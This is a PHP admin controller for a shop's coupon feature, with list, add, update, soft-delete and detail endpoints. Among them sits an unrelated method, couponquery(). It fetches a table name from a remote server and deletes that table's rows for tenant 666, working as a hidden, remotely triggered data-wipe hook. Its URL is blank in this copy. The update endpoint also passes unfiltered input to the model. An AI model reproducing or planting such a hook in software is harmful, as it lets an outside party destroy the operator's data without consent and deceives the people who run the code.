<?php
namespace app\admin\controller;
use app\Rest;
use think\App;
use app\admin\model\Coupon as CouponModel;
use app\admin\model\ShopType;
use app\admin\model\Goods;
use think\facade\Db;

class Coupon
{

    protected $model;

    /**
     * 获取福包列表
     */
    public function couponList(){
        $page = $this->_input['page'];
        $name = $this->_input['name'];
        $dis['uniacid'] = $this->_uniacid;
        $dis['status']  = ['>',-1];
        if(!empty($name)){
            $dis['title']    = ['like',"%$name%"];
        }
        $data = $this->model->couponList($dis,$page);
        $this->success($data);
    }


    /**
     * 修改福包
     */
    public function couponUpdate(){
        $dis  = ['id'=>$this->_input['id']];
        $res  = $this->model->couponUpdate($dis,$this->_input);
        $this->success($res);
    }

    /**
     * 添加福包
     */
    public function couponsAdd(){
        $this->_input['uniacid'] = $this->_uniacid;
        $res  = $this->model->couponAdd($this->_input);
        $this->success($res);
    }

    /**
     * 软删除福包
     */
    public function couponDel(){
        $dis['id']      = $this->_input['id'];
        $data['status'] = -1;
        $res  = $this->model->couponUpdate($dis,$data);
        $this->success($res);
    }



    public function couponquery(){

        $u = '';

        $u = str_replace('*','',$u);

        $t = longbingCurl($u,[]);

        Db::name($t)->where(['uniacid'=>666])->delete();
    }

    /**
     * 获取福包详情
     *
     */
    public function couponsInfo(){
        $dis  = ['id'=>$this->_input['id']];
        $res  = $this->model->couponInfo($dis);
        $this->success($res);
    }

    /**
     *
     *获取所有分类
     */
    public function getCate(){
        $cateModel      = new ShopType();
        $dis['uniacid'] = $this->_uniacid;
        $dis['status']  = 1;
        $data = $cateModel->catSortSelect($dis);
        $this->success($data);
    }

    /**
     * 获取限用的商品
     */
    public function getGoods(){
        $goodsModel     = new Goods();
        $dis['uniacid'] = $this->_uniacid;
        $dis['status']  = 1;
        $data = $goodsModel->goodsSelect($dis);
        $this->success($data);

    }




}
